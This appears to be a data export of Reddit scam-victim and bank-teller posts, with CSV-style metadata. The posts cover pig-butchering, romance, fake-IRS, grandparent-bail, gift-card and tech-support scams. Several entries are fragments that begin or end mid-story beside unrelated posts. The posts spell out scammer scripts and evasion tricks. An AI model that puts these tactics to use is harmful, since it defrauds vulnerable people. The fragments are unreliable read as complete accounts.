I was supposed to go file a police report but I honestly was a scared 19 year old and just… didn’t do it. So the money sat in this account for like 5 years, and I totally forgot about it. 

One day, I get a letter from USAA saying I have an account with money and if I don’t claim it they’re sending it to the government. I remembered almost being scammed, but I didn’t think there was any way this money could be real, and thought maybe I was being scammed again. 

I called USAA (their number listed on google, not what was on the letter) and confirmed that yes, the money was most definitely real. 2 weeks later I had a check for $3,000 in my mailbox, which promptly went into a savings account. 

The whole time I’m thinking there’s no way this is real, I’m definitely being scammed, even after I had confirmed it was real with USAA- but nothing ever happened.

1695758127.0,I paid for this lesson so you don't have to. Never buy from eBay ever,"eBay is a buyer's paradise. Money Back Guaranteed right? Wrong!   


I bought a laptop from what seemed to be a reputable seller - 99% positive reviews, long history of selling on eBay. Nothing stood out as suspicious at all. Laptop arrives - except it's a box of concrete. I call eBay to tell them that I have received a lovely box of concrete but it wasn't what I ordered. eBay tells me they'll get my money back. One hour after my call with eBay, my account gets suspended for the following: 

""- Requesting partial refunds without returning the items.   
 \- Filing excessive returns claiming the item is not as described when the seller described it accurately.""  


[Brand new laptop - mint condition](https://preview.redd.it/yv9qd2vrjnqb1.jpg?width=2160&format=pjpg&auto=webp&s=0233676b551a5db7dd7eb52f987b6409ba94f966)

You look at the picture and you tell me - does it look like the seller described it accurately? (hint: it's supposed to be a laptop). And besides, am I really supposed to return this to the seller?

So after I received this email, of course I ring eBay again, asking about why my account got suspended, and whether or not I will be getting my money back. eBay customer service kindly tells me that the seller has three business days to decide whether they are gracious enough to refund me for the concrete, otherwise I will have to seek ""other ways"" to get the money back! And they won't unsuspend my account and they can't talk about why it's suspended!! 

Money Back Guaranteed policy is great, except when eBay decides to suspend your account, then I guess the policy doesn't apply to you anymore. 

I have never returned an item on eBay before, and although I rarely ever shop on eBay, the reviews I do have from sellers are positive only.

The seller does genuinely look reputable, they're a business with many great reviews from buyers, each of whom have good reputation. I had no suspicion at all that this could happen given that I was dealing with such a reputable seller with a long history on eBay. The conventional wisdom of ""don't buy from new accounts"" and ""look at the reviews"" just doesn't work anymore, because everything \*looked\* legit. 

TL;DR: I had a 0/10 eBay shopping experience, most money I've ever spent on concrete, and the concrete isn't even that good to be honest (it was supposed to be a laptop). There are people out there with a fantastic reputation on the platform who can do this to you, and eBay won't necessarily take your side.

1666806960.0,My experience identifying various scams as a teller,"I've been the equivalent of a universal banker at credit unions for a few years, and I thought I'd share some of the scams I've encountered, how I spotted them, how they work, and at least with the last story, have a bit of a laugh. 

**Overpayment Scam**

Member comes to the drive-thru when we're pretty busy. She wants to deposit a check for between $3-4k. Her balance is roughly $200 or so, and I checked her recent transactions to see if a deposit like this was usual for her. It wasn't, as she hadn't had a deposit of more than $500 in the last 3 months. I look at the check and I don't recognize the bank its supposedly drawn from, nor do I recognize the maker. Its some generic ""advertising company."" 

At this point I'm following usual risk-mitigation procedure in depositing the check with an extended hold on it, but I didn't immediately think it was a scam. I return to the drive-thru and tell her ""Alright, I made the deposit for you, but its on an extended hold because of the amount. The funds should be available within 5 business days."" 

""Oh no, that's payroll, they told me to tell you its payroll."" Alright, red flag #1. Payroll checks have different regulations, and unless your real-life employer has bounced your checks in the past, we can't place holds on them. But of course what is 'payroll' is subject to verification. Usually its enough to see that they've deposited checks in similar-amounts from the same maker on a regular basis, which can be verified by their account history. If we're really cautious, especially if they just opened their account, we may even go so far to call that employer to verify. 

""Is this your employer?""

""Yes""

""It doesn't look like you've received a check from them before, is this a new employer?""

""Well they're going to wrap my car for advertising and I need to wire $1500 of it by tomorrow so they can do the wrap. So there can't be a hold on the check or I'll lose the gig!"" And there it is, red flag #2 and confirmation. I explained the scam to the member and after a bit of conversation she was appreciative and asked us to reverse the deposit and shred the check. 

[More info on car-wrap scams.](https://consumer.ftc.gov/consumer-alerts/2016/08/how-spot-car-wrap-scam) Same goes for any type of ""Here's more than we agreed, you need to pay a portion of it back for whatever reason.""

**Grandson Needs Bail**

Another time I had an older member come to the teller line very frazzled. ""I, um, I need to do a wire, can I do a wire? How do I do that, I've never done that before?"" She had real fear in her voice.

I pulled a wire request form for her, but before I handed it to her I asked what the purpose of the wire would be. 

""What does it matter? I just need to send the money as soon as possible. How soon will it get there?""

""I understand, but its important for us to gather a bit more information for all wires we do. Would you mind telling me a bit more about the purpose?""

While still sounding scared and frazzled, she also became embarrassed and told me [her grandson called and needed money for bail](https://consumer.ftc.gov/features/pass-it-on/imposter-scams/grandkid-scams). She told me how good of a kid he was, and how he made it clear that he needed the money immediately. She showed me a note that she hastily-wrote with the wire instructions her 'grandson' gave her over the phone.

I asked if she was sure this was her grandson, and she became very offended (learned to use more tact after this one). I tried sympathizing with her, and the (theoretical) urgency of the situation, but I asked her to take a moment to think. Did he call from his usual number? No, he was at the police station. Did he say what police station? Yes, several states over. Did it show up on the caller-ID? She doesn't remember. I asked when was the last time she spoke to her grandson or his parents, and she said its been about a week or two. She hadn't tried contacting any of them since the call. 

I told her I had some concerns that is a scam, and told her that its very common for scammers to call older people pretending to be grand-children needing money urgently. She assured me she knew her grandson's voice when she heard it, but I could tell she started to question the situation. 

She went back and forth trying to rush me to complete the paperwork, and asking me questions, clearly doubting the situation. 

I suggested she call the police department directly to ask about her grandson. I even wrote down their number I got from Google. I told her to try calling her grandson directly at his cell-number she has, or to call his other family. I assured her that wires wouldn't go out for another 2 hours anyway, so she had plenty of time to research this further. 

She still seemed frazzled and not totally convinced this was a scam, but she said she would go do those things and come back later. I didn't see her again, so I hope she realized it was a scam.

**New Account Deposit**

This one's different because the victim would be the credit union. Woman came in to open a new account and presented a business check for close to $3k for deposit. As a safeguard we place all (non-payroll) checks deposited into a new account on an automatic 14-day hold. I didn't explain that until her account had been opened and she became very flustered. She told me that she needed to get the money now, something about her sister having a medical emergency, but the story changed a few times. I told her she could deposit the check at a financial-institution she already has a relationship with, or she may go to the issuing bank to cash the check, but that our policy was to place it on an extended hold. 

She argued, so I offered to attempt to verify the funds with the issuing bank and ask my manager for an exception (only remotely possible if I could verify the funds.)

Of course the (supposed) issuing bank is small with only 2 branches, roughly 3-hours away. I call their customer service and they don't verify funds. Most places don't because its a security risk. If someone has an account number they could just pretend to have a check in hand, ask ""is the account good for it?"" and subsequently get information about the balance on an account they're not on. 

She *very* reluctantly let me deposit the check with the hold, then came back an hour later asking to reverse the transaction. Said she found a branch of the issuing-bank 30-minutes away (no she didn't) and would go there. I learned why we had that extended-hold policy, and I expect her account sat unused at the $5 minimum forever. But at least she didn't get $3k from us using a fake check and let the account default. 

**Social Security Number Has Been Compromised**

A middle-aged man came up to my teller window and handed me a large taped-up Fed-Ex box and said ""I need to deposit this.""

That's weird af, and also potentially dangerous, so I immediately asked him why, what it was, and told him to open it himself. He refused and just said ""It's $40k, I just need to deposit it.""

I called my manager over to supervise and he agreed to open the box together. Inside were 4 bricks of aluminum foil, which of course is even weirder. I asked the member what was up with that, and he said ""Yeah they told me I had to do that to ship it.""

In each brick was indeed $10k of strapped 100's. While my manager and I dual-controlled the count (the member was adamant that there has to be $40k exactly, and I kept telling him we can only deposit what's physically here) I asked him what the story was.

He got a call from 'the IRS' saying his social security number has been compromised, and that he needed to move all of his money into a 'secure wallet'. The callers told him that his account at the credit union wasn't safe, and asked him how much he had. $70k, he told them. They said he needed to ship the money to a PO box in Ohio so the 'FBI' could ensure its safety. They told him this needed to be done in cash, and he needed to wrap each bundle of bills in aluminum foil per 'IRS' policy. 

That's in fact done to attempt to by-pass shipping carrier scanners which try to find these types of things and reject the packages. You're not allowed to ship cash for a reason, after all. 

Fed-Ex was able to catch this box of $40k and give it back to our member, but they did not catch the other box which has $30k. He lost that money. 

We had a lengthy conversation about the scam, how it worked, and what to look out for in the future. I told him he can always call the credit union at any time if he's unsure about something, as we're trained to spot these things. 

I also had a lengthy conversation with the manager of one of our other branches who allowed him to withdraw the money the previous week in the first place, despite knowing it was a scam. He said he tried to convince the member, but clearly he didn't try hard enough. 

**Million-Dollar Bill**

I have a lot of sympathy for folks who get scammed, as a lot of these ruses are really sophisticated or otherwise obfuscated, leading to confusion. This one though, I just have to laugh. 

Member walked right up to my teller window and shoved her phone in my face with a picture [like this](https://i5.walmartimages.com/asr/4229c04f-64cc-42d1-a41b-0ee9f182bf53_1.b551e2367dc61a1671c42b0a701416da.jpeg?odnHeight=612&odnWidth=612&odnBg=FFFFFF), except the bill was in someone's hands. 

""Is this real?"" she asked me. I really tried hard not to laugh.

""No, that's not real. There's so such thing as million-dollar bill.""

She just kinda went ""Hrmph."" I asked why she was asking, and she told me someone in Africa needed to get rid of it and was only asking for $2500.

I said, yeah, no, that's a scam. Do not buy that. There's no such thing. She asked if I was sure, and I said yes.

Then she called someone on facetime or whatever and *held the phone up to me.* ""Can you just tell him that? What you told me.""

I swear to god I thought this woman was putting me on the phone with some Nigerian scammer. He even looked like he was in a bunker or something. Very flustered, I tried to tell her not to engage with it, its a scam, don't bother. She insisted, ""No, just tell him what you told me.""

""Uhhhm. Sir. Yeah, um. I was just telling our member here that there's no such thing as a million-dollar bill.""

He immediately grumbles and is agitated, asking how I know. Good lord. I plead with the woman to hang up, not to engage with the scammer, and to please not put me on video with some criminal. She said ""What? No that's my husband."" and told him ""See, I fucking told you it wasn't real,"" hung up on him and left.",Scams,10627,1932,338,1

1626179227.0,Fell for a crypto scam and lost all my savings ($240k) - what to do?,"I was recently scammed for all my savings (about $240,000) by someone I thought was my best friend.

I first got into contact with this person when she randomly texted my number, asking me if I was a worker from her local animal shelter, since she wanted to adopt a dog. I told her that she must have the wrong number since I live in a different state, but since I also happen to volunteer at a small animal shelter (and so does my mom) I gave her some good advice about what she could do. We kept chatting very happily after that and seemed to hit it off.

We kept talking for many hours every day about many things, and one of the things she was very excited about was some new crypto currency that she thought will be the next bitcoin. I had always been thinking about investing in crypto, but knew very little about it and told her I wasn't interested, but she didn't seem to mind at all and we just kept talking about other things.

As time went on she showed me screenshots of her currency and how much it was rising, so I asked her to help me just learn and start investing in the standard crypto currencies. She helped me with every step for many hours, and eventually I invested ~10k in the standard currencies like ADA, ETH, etc.

Eventually I saw how much money she was making on her currency, and asked her to help me invest in it too. Again she spent many hours teaching me, basically the way it works is you make an account on her currency's website, and send some standard currencies (BTC/ETC/USDT) to your account there, and charge/exchange the standard currency for her currency.

I started with investing just $5k, and over time I trusted her more I invested more, eventually up to about $70k. Everything seemed to go very well and (it seemed like) I made a ton of money. Per her recommendation, we would hold the currency until it was about to go public and then take our profits. We talked about how we would have a lot of money and also be able to help many people and animals with that money.

Then she let me know of another currency she thought would be very successful, but this time she was only able to get one code (needed to unlock an account). She said that since she trusted me so much, I could be the one to open the account and have sole access to it, and she would send me BTC/ETH to my address when she wanted to invest in it.

So that is what we did, and her second currency worked basically like the first one (with how you exchange BTC/ETH on the website for this new currency). I invested about $70k into this currency over several weeks, she sent me probably around $400k in BTC/ETH which I then exchanged for this currency as well. She really gained my trust by trusting me to handle hundreds of thousands of dollars worth of her money, so I thought surely she couldn’t be scamming me either.

Eventually, the first currency we invested in announced that it would go public soon, so we prepared to cash in our profits. This was around 3 months after initially talking to her, and we had been talking for hours every day like best friends. But there was a problem, it seemed that we needed to ""unlock"" the currency first before cashing it in, by having $100k in USDT/ETH/BTC in our account. 

She unlocked hers first and even sent me a screenshot with her millions of dollars worth of USDT. It took me about a week longer to move my funds from coinbase into the new currency’s website. When I finally moved my funds into the new currency's account, it wouldn't let me unlock it, and she told me the website had changed the rules and I needed to put in a lot more money now. I did not have more money though, and I told her that, and I tried to withdraw some of my $100,000 USDT out of this website, but it did not let me.

A few days later, both of the websites I used to buy those currencies went offline. My ""best friend"" said she would see what was going on and help me recover my money. I never heard from her again. Today is exactly 1 month from when the websites shut down and from when she was last online.

I am no crypto expert, but today I believe I was finally able to at least track my 100k USDT from that account. I saw it was indeed sent away to some random address shortly after the website went offline, so of course I now know for sure that I have been scammed.

TLDR:
I got scammed for basically all my money (70k + 70k + 100k = $240k) and I guess there is nothing I can do about it.

I know reading my story it seems that I was very stupid and guillable, but I am just feeling lost now and I don't know what to do. Does anyone have any advice for me? Anything would help.

I know that there is something about deducting capital losses from my taxes, but I am not sure how that works. Do I need to save some documentation or something to provide evidence to the IRS?

Also more than half of the money I used to finance the total $240k is from selling stocks during this time, so some of that I still need to pay capital gains taxes on. Is there a possibility that I will actually owe more money to the government than I have, and get in trouble?

 I got a text message from Bank of America about fraudulent charges.  I logged onto the BoA website and there were 2 attempts at purchasing a Sam's Club membership.  As I was going through the screens on the BoA website, I got a robocall.  I answered and there was a recording saying ""this is BoA fraud department.

A woman with a heavy indian accent comes on the line and says she has to verify my account and can she send me a code. (Red flag, but OK.)  A few seconds later, I get a text from BoA with a code and the warning that ""we will never call or text you asking for this code"" so I definitely wasn't giving out the code and I just hung up.  


This was really convincing because there ARE 2 fraudulent charges on my account and every text I received from BoA was real. I had previous texts from them about other transactions and logins. When I logged into my account, I used my bookmarked page and my password manager saved password popped up (which wouldn't have happened if it was a fake site without the right domain.) 


I don't know if the timing of the call was coincidental or not---I don't see how they could have known I was on the real BoA website looking into the fraudulent charges but since my phone rang as I was literally hitting ""submit"" on the fraud page, it made perfect sense to me that they would be calling asking for more details so they can investigate.

Now the current task needs like 780usd to be completed after all the money i put in (i have a couple of days left). Now im wondering did anybody actually get scammed after completing a task or do they always raise the price until they dont have any money to spend so you cant complete the task. 
I in the case of me losing all the money, do you guys have an idea what i should do? Or i just have to move on?

Edit: thx for the supportive comments and thx for the advice I will not send them any extra money. Im sorry for being arrogant and emotional yesterday. Idk wtf to do with that loan tho.",Scams,902,184,16,1
1685969382.0,Is this a scam,"Buddy of mine met this girl on tinder. They have been talking for a couple months. He said he video called her and talked to her many times. She convinced him to invest with her. He then approached me about investing with her. Said she will only ask for 6% commission. I said I don't know. He said he never met her in person but has Skyped with her a few times. So she is actually a woman and not a man. 

So is she real? I never heard of a scam where the scammer asks the mark to find more people. Is this a new technique? Just seemed out of place for her to have him ask his friends if she is scamming him.



Update** I talked to him. Showed him this thread and sent him links about pig butchering. He is still convinced it's legit. He said he never ""gave"" her the money. It was all sent to a site where he controlled it. She told him when and how to trade. So he didn't give it to her. She never had any of his account info. I asked him to try to withdraw money. He said he tried. They told him he had to pay a transaction fee, which he paid. And now they tell him he needs to pay a tax on earned income. I told him that's part of the scam. To keep butchering until he has nothing. But he is still convinced and is trying to get the money together for it. Guess we shall see. Maybe another update in a few days.",Scams,1315,269,37,1
1641609191.0,I got scammed into stealing $6000 cash from my work place last night,"I know this is long but it’s insane and I’m really depressed 
I am a store manager for a small business with a few locations and last night at around 5:30pm half hour from closing I received a call to the store landline by someone impersonating my boss’ brother. I know his brother works in the company as well and he sounded just like my boss so I believed it was him… as soon as he told me what was happening I immediately freaked. He said his brother (my boss) was laundering counterfeit bills and one of my employees was an accomplice. He told me a US marshall was monitoring our call so I said put me on with him. So an entirely different man gets on the phone and gives me a badge number, phone number and lutenient name. I was told to go through every hundred dollar bill in the store and read off the serial numbers to check they are real. 
This dude knew things he shouldn’t have and was making it so personal and emotional. The marshall was so professional. They knew names of my employees I didn’t give, where things were in the store. They told me if I said anything to anyone I would be arrested for violating federal confidentiality. I was told if I hung up they would come to my house so I was on the phone for 5 hours shaking like a leaf under an evil spell that I was saving the company and the family. 
At one point I said I didn’t want to do this I want to go home I need proof and someone to come here and prove it, he said my boss would see the cameras and it would cause a scene and blow their cover. I drove around for 5 hours on the phone with this nasty freak with $6000 cash back and forth from the store to kroger dollar general walgreens etc that carries these things called MONEYPAK cards (so be aware of those people) and load the money on them then read him the pin number. I even broke a register at a kroger trying to take make too large of a transaction. 

I truly feel so ashamed and was told I was a victim by the police but I don’t know how to move past this. My boss was nice and kind of laughed it off yet was very concerned for my safety but I feel disgusting and sick and can’t help but feel they think I am the dumbest broad alive. I haven’t stopped shaking. They made me give them my social security number for proof thay the purchases matched (the stores took my ssn too) and photos of the front and back of my ID
Oh and the best part is they wanted to meet me at 5 in the morning for an “audit and drug test” I would have gone. My mom said I could be half way to Venezuela by now. When they got all the money and cards they wanted & I was finally able to hang up and go home I fainted in my car. When I came to I caved and called my parents and they called the police. Filed a report. Any advice or similar stories or anything is so appreciated I just feel so alone and traumatized.

I told him to tell the police and his divorce lawyer. 

What else can we do to get in front of this? I’ve tried reporting the profile but Facebook will not remove it. I have never gone through this, they have all his banking info and passwords. He’s changed the passwords and contacted his bank. I’m just scared for him. This will fuck his life up. He was an alcoholic before his daughter was born but he quit drinking when she was born and for five years.

6. She found his passport lying around while he was showering and it had a different last name then what he gave her. When She confronted him he said he has to be careful because of his families wealth.

1693359072.0,Gift Cards for Puppies?,"I work as a bank teller and a woman I've never waited on before came in to withdraw $1000. She was excited because she was getting two new puppies from a breeder. I chatted with her and asked a few questions about the dogs, and it all seemed fine until I asked her how she wanted the cash back. She said it didn't matter since she was just buying gift cards anyway. I paused, confused, because maybe I misunderstood her. She very happily told me that oh yes, she was paying for the animals with two $500 gift cards.

Upon further questioning, she revealed that she hadn't actually seen the puppies in person but had seen a video of them. Oh, and they weren't local. The breeder lived a six hour drive away. But they were going to get the puppies to her as soon as she sent photos of the gift cards. I explained that this was a scam and she didn't seem to believe me. I talked her out of going thru with it but I think she just backed away because of my insistence. I decided to add a note to her account that she was potentially a victim of a gift card scam.

Lo and behold, two hours later, another teller at another branch called and asked for me. They wanted to let me know the lady came in to withdraw cash and the teller wanted more information from me. I explained. So I guess the woman mentioned the puppies but played dumb about the gift cards. In the end, the teller tried to explain she was being scammed. But we can't tell people what to do with their money so it was given to her. The other teller made note on the account about the transaction. 

A week later, the distraught woman goes into a third branch saying that her money was stolen from her and she wanted to dispute the transaction.

first off I’m not from a well off family at all, actually my mom struggles to pay rent every month and recently divorced my stepdad because of money problems.. so I worked full time during high school and saved up at least 10k(all my money). then I started looking into investments and I ended up going into this day trading.  the people I met IRL presented and basically sold me on how you can make money everyday from your phone by buying this course, learning trading techniques, and then putting money onto the trading site (Binarycent.com) so I did. I ended up putting a lot of money into it but never tried taking it out. I kept “losing” all my money then finally I tried taking out 3k. it wouldn’t let me withdraw and then I got locked out of my account after contacting the site multiple times. 

it was really hard to accept that I lost that much money. I would cry at work and think about how I could’ve just gave it to my mom. or how great my life would’ve been if I didn’t meet those people who introduced me to that. or be more cautious with where I put my money into. I still have a lot to learn, I always get scammed because I’m gullible and tend to see the best in people. I felt so depressed for weeks, but eventually I picked myself back up. I used that as fuel to find out ways to make that money back as soon as possible. side hustling, as well as DoorDash delivering, flipping cars. I’m about to end off the year with 30k..from working full time and then delivering after work during all of summer, and then just full time during community college. the only way I overcame feeling like my world stopped spinning was by making it my goal to make my money back in the shortest amount of time. 

that was my experience (there was much more) but I’m scared it will happen again. I would never forgive myself if it did. I learned to not trust easily, if at all. i really gained trauma from these scammers and it’s sad I had to learn this lesson for such a large price.. I hope this resonates or comforts anyone who is going through something similar.

Not going into to much information about my current situation but I had gotten an email from people posing as geek squad talking about how I needed to cancel a subscription and I thought it was legit cause they had the name and the amount of money that subscription cost, I should have looked more closely or called my dad but I wanted to handle it like an adult on my own, I thought it would be easy enough, so I call them up and so the standard talking on the phone with the guy even downloaded one of those apps that's let people control their mouse from where ever, I've had that happen with people working on my computer before, I should have listened to my bad feeling but I'm pretty much paranoid/anxious/on the autism spectrum so I just talk my bad feeling up to my brain just being like that.

SO what happened next was so dumb where they take me to like a sever where I had to type in the money to take out off my checking account or something and then they ended up sending me 2000$ and I freak out cause I even got a text on my phone and everything thing about and I start having an anxiety attack but the person I was talking to on the phone was taking advantage of me, playing nice just telling me to take an Uber to Walmart to get two Apple card to put 500 in each and then give them the money back, AGAIN I should have seen the red flag but I was so anxious I wasn't thinking right, I thought I was gonna go to jail, I did what they asked me I stayed o. The phone with them the whole time and gave them the number on the card and thought I fixed the issue, ONLY TO FIND OUT THAT THEY WHERE LYING TO ME THE WHOLE TIME
They told me not to tell my bank or family about it and if course I did and my dad called it out, which led to me locking my bank account and try to claim fraud.

She lost her husband a year ago. In her loneliness, she was talking to a man for a couple of months. We had no knowledge of it, as he told her he was in a very secretive position and if she told anyone, he could be killed. He was apparently to arrive to meet her, but just before his flight, something happened to him. He claimed to be a surgeon of some sort, I forget. His 'agent' called her and asked if he could get her help in retrieving him, he only needed x amount of money. She spoke to another relative who started being disrespectful, telling her it was dumb for her to believe this and from what I understand, berated her before walking out of the house leaving her in tears. That's when she called me. I wanted to convey to her that this other relative is not wrong. He just handled it horribly. I told her of the many scams that I've read about here. But I acknowledged her feelings. I let her know that I understand that she's been lonely, and this person drew her in. She calmed down and listened to what I had been telling her. After we ended our call she researched things online and later sent me a message saying that she appreciates me showing her this sub. That she also cut off communication with the guy and his agent.

So for 40 dollars, they send you a starter kit with detailed instructions on how to make the magnets. Then you send the magnets back and they ""sell them"" God knows where, I can't remember. So I sent them a check for 40 dollars and they *actually fucking sent me the materials*. 

After the starter kit magnet was made you had to send it back for inspection, then you could purchase the actual materials to make dozens. I can't remember the price but it was a decent amount of money. They promised you'd make hundreds of dollars a week.

1572527734.0,My mom is being scammed and it's destroying our family,"I found out two weeks ago that my mother has been ""cheating"" on my father with a guy who randomly added her on Facebook that she did not know.   I know this guy has to be a scammer.  He claims he is part of NATO and is stationed in Syria.  She has convinced herself this person is real and that he will be returning to the US in the winter.  She has sent this person at least 6 phones, and all have been dispatched through international couriers. She claims that ""NATO is paying for her phone bill"".  In addition she took $20,000 from my father's savings (aka his total life savings) and sent it through FedEx.  She claims the money went to North Carolina.  I don't have a lot of information to go on to try and track down what is exactly happening because she is delusional and has deleted most evidence of the transactions off her phone.  My parents are currently going through a divorce because of this and she is trying to drain my father dry, and I know that whatever money she gets is going to this scammer.  Has anyone had a similar experience and how did you handle it?  I'm at a complete loss as to what to do.

Update:  Still no divorce.  My father called me yesterday to tell me he was giving her a second chance.  Of course, I flipped out.  He came to visit me today and told me a bunch of things.  One, she was back with him for one day and it became apparent to him that she 100% believes that she has not been scammed.  He took her to the AT&T store to cancel her account (part of the stipulation for him taking her back was for her to delete her Facebook and not have a phone with internet access).  She now has 11 phones/numbers associated with her account.  He told the people at AT&T what she had been involved in, they asked her who was paying for the phones and she said ""NATO"".   I think my dad needed to have that happen to see how far gone she really is and that he can't take her back.  I advised him to give her whatever she wants and be done with her.  Two,  he had the state police come to the house and take a report of what she had been doing with the phones.

Essentially, this guy who was scamming her was telling her that NATO needs phones so that the workers can call their families, but they can't get the phones themselves.  In exchange for her sending them the phones, NATO ""paid"" her phone bill (aka scammers gave her a random credit card traced to NC to pay the bill).  They then told her that they needed to ship phones to their family members in the US so that they could have a way to communicate with their lives ones overseas.   So different phones (bought by other people falling for the same scam) would be shipped to my mom and then dispersed.  

The $20,000 was sent because NATO had given my mom a ""special mission"" to help them get a package smuggled back into the US.  Essentially the money was being used to pay the ""smugglers"".   In return, this guy she was in love with would be able to come back to the US and be with her because his mission would be complete.

I have already taken the steps of logging out all sessions, changing my password, & enabling 2FA via Google Authenticator. I also took a look at my orders, and I cannot see any gift cards in my order history (I am not sure if they would show up there?), nor are there any unusual charges to my debit card according to my bank. So far it doesn't *seem* like any actual transaction has taken place?

I am not really sure what else I should do now. Is this an attempt at a scam, or a mere system error...? What steps I should be taking to proceed now? Feeling a little frazzled right now, hoping this turns out to be nothing to worry about.

1673393198.0,Do you need help with your tire?,"I was driving into parking lot, and damn, blew my tire. So I get into the lot, pull out the spare and get to changing it.

Then as soon as I get to work, a dude comes up “hey, I am an auto body shop mechanic, you need help with the tire?”

I say “no I’m good, I’ll just change it to my spare”

Quickly forget about it and continue with my business. Then as I’m changing my tire, I hear that guy repeating the same pitch to some grandma who is sitting in her car. The granny is like 80 years old, visibly confused, but I don’t pay much attention.

The guy goes all “oh ma’am, look at your tire. I have a grandma and she looks just like you, I can’t let you drive like that. Let me help you”. I take notice of that but visibly still doing my thing. 

She’s all confused, he keeps with the same pitch, I guess she eventually agrees. He takes a rubber mallet and a wrench, tightens the lug nuts and taps the rubber mallet lightly. 

I’m almost done by that time, just putting air in spare. Then I hear the grandma go “$200 for what? We are in a random parking lot, let me call my son”

The guy goes like “well ma’am I fixed your tire, it would’ve been more expensive at a body shop. I’m only asking for $200, it’s a good deal”. The woman is visibly confused. So I come up I tell the woman to call her son and not give anyone any money. I ask the guys what “repairs” they performed that costs $200. He quickly goes “man you don’t know shit in cars, go back to changing your tire. You took 2 hours to change it for a spare”. I tell them to leave the woman alone, he continues to argue. 

I call the security of the lot, security comes, and makes them go away. The guy then threatens me, calls me a f@gott, says he will fight me, and (the funniest part) says that he will call the cops because I am harassing him. (Lol)

1660143545.0,"I fell for the ""Pig Butchering Romance"" Scam","Hi,

I wish I came across this when I was doing my research for my supposedly due diligence. 

I got romance scammed as well. I really thought I was careful, and I questioned everything yet, I got had. He contacted me via Facebook and was very friendly and respectful. He was not Asian though, the profile was of someone from the Netherland that moved to Texas, US. 

We had some great conversations, and he was sharing pictures and videos of himself and what he was doing all the time. He even shared that he has kids and showed me videos of them. His profile had posts from a few years ago with videos and photos. He talked to me about how he believes in fate and that he believed that God brought us together. Though I did not buy it at the time, on the subconscious level, I do believe in fate and In God. 

After consistent communication for a month, I started to get interested. And as I have been single for a while, I thought to myself why not? Then after another half month, he talked about how he has been gold spot trading and that it was very secure, and that he has a great experience. At first, I declined as I don't understand trading and I did not want to take the risk. He was not pushy at all. But from time to time, where it would come up organically, he would show me screenshots of his trades, they had few losses and big wins. And then I agreed that he teaches me how to trade. But thinking back, I misunderstood what teaching meant. It meant to just follow instructions but the way I thought about it was that he was going to give me actual lessons. 

I did search up the applications he asked me to download, MT5 and Newton and I did not find any red flags on them. He showed me how to use [mcpogroup.com](https://mcpogroup.com/) now called [mcpomarkets.com](https://mcpomarket.com/) to send money from Newton to the MT5 (Meta Trader 5). Until now, I know the instructions, but I don't really understand them. It seems that I did not do thorough due diligence. 

I started small to test it. I started feeling a false sense of confidence and control with each transaction. Throughout it all, he was explaining what to do clearly and skillfully answered all my questions. I even went and started to educate myself about gold spot trading as it was the only trade, he guided me through. Then, he told me that the last 2 weeks of July is a great opportunity to invest in the gold market, based on his analysis and his finance teacher, and it would be a shame to pass as he wanted me to improve my financial situation and he really cares and doesn't want me to miss it. And he even offered to match any contribution I was going to make to prove that it is safe. I hesitated for a while, and he wasn't pushy, but he did play me emotionally and psychologically and he convinced me that it was very safe and that I would have my money back and a lot more in a very short time. So, I fell for it and invested an additional $10K CAD for a total of $10,600 and he deposited $7K USD in the MT5 account shortly after I made my deposit and in a matter of a week and a half that turned to $100K USD, which was amazing in my view. 

Then he suggested that the data analysis he did, and his finance teacher confirmed, indicated that the market would be very bad and risky for the coming few weeks, and he suggested that I withdraw the money to which I agreed as I wanted to test the withdrawal for a while but somehow, I just did not. He walked me through how to request the transfer of funds from [mcpomarkets.com](https://mcpomarkets.com/) to the Newton crypto wallet. Again, I followed the instructions but still don’t understand them. 

It took a little longer to get the funds out than it took to transfer the money in and his answer to that, when I asked him why, was that I need to pass the audit. The next morning, I received an e-mail from [mcpogroup.com](https://mcpogroup.com/) telling me that my request for withdrawal was approved but with a caveat. They said that before getting the money, I needed to pay taxes on the profit which was 8% of approximately $86K USD of profit. I replied to them asking them to take it from the money they are holding and give me the rest. And they said no, I should make a separate payment. 

And here is where I got sure I was scammed. My heart fell into my stomach and felt so stupid, naive, and very gullible. And I discovered when I looked further that I fell for the ""Pig Butchering Romance Scam"". I tried to get him to give me the money to pay for the taxes and I will send it right back and he refused, saying that though he could help me, he wanted to see that I can handle such a small matter so that he is assured that our future together is a safe and will be a great one. Just typing that makes me want to vomit. 

I can't believe how naive I am. I haven't let him know that I figured it out. All the accounts are still open, and I still can see the money in the MCPO account. I am not sure if there is a way to get it out. All I want is my investment. Does anyone know if that is possible? Please help.",Scams,5068,965,116,1

1681941013.0,My mom is a victim of a romance scam and she is in denial.,"My mom is 73 years old. She has been talking to a guy she met on Tinder since July last year. He says he's 48 years old, that he has a fat bank account, that he is a US citizen, but was working in Turkey for the USAID (United States Agency for International Development). He said he was coming back to the US to meet her but he lost his wallet so his bank account is locked until he comes back to the US. He initially asked her for $1000, which she sent to him through CashApp. Then he said that he was attacked and had his finger cut off and then the hospital wouldn't release him until he paid his bill (as if a hospital could hold you prisoner until you pay). She sent him more money. Every time he says he's coming back to the US, something happens to where he can't come and she needs to send him more money. Because I have been adamant with her about him being a scammer, she stopped talking to me about how much money she has been sending him, but my daughter knows that she has been sending money to him at least once a month. I have known from the very start that she is being scammed. I have told her this multiple times. My husband, my daughter, my daughter's boyfriend, my mom's friends, and even her coworkers have all told her that she is being scammed. I don't know how to prove it to my mom. The only information I have is his phone number (which is a Google number) and a picture he sent her that is supposed to be his passport. I have searched the name on the passport with no luck. I have reverse image searched it, also with no luck. Are there any resources out there to help with this? Even if she doesn't get her money back, I just want to be able to prove it to her so that she will stop sending more money. I'm so frustrated with this and scared of how much she might end up losing if I can't stop this.

found an account on tinder of someone only 3km away from me whose bio said they were interested in hookups. it's been a few months since i've last had sex and i was in one of those phases where no matter what you do you feel overwhelmingly horny for weeks on end (is that a common thing or just me?). she had her snap in her bio so i messaged saying i was interested. she told me there was a $45 payment, and i was thrown off guard for sure, but i thought ""hey, it's only 45 dollars. she's really hot and i have enough to not dent my wallet with that."" paid the fee, waited until 8 when we were supposed to meet then everything went downhill.

she told me that she needed money for plan b and condoms before she came, and i really didn't want to send any more than i already had but i was admittedly desperate to not lose the opportunity. she had already sent nudes with her face in them and shared her live location that showed she was close to me, so i gave in and sent an extra 100.

